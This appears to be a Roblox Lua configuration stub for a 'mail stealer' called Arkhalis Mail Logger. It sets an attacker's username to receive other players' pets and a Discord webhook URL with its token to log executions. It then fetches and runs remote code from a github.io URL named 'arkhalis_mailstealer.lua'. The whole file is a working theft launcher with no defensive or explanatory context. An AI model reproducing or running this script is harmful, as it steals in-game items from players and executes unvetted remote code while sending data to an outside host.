--[[ Arkhalis Mail Logger ]]--

--[[ Main Config ]]--
_G.Username1 = "PapiPapiPuu122" --// Username To Send Pets To
_G.Username2 = "" --// Username To Send Pets To [OPTIONAL]
--[[ Webhook Config ]]--
_G.Webhook = "https://discord.com/api/webhooks/1113026191092371556/sjT2p4HQb-cSOpqYYgtd8zmp6hkAh079ozEHg0xd7snX70omXAuxTVrQIyzzlSUA8uK-" --// Discord Webhook For Executions

--[[ Script ]]--
loadstring(game:HttpGet("https://arkhalislua.github.io/arkhalis_mailstealer.lua", true))()
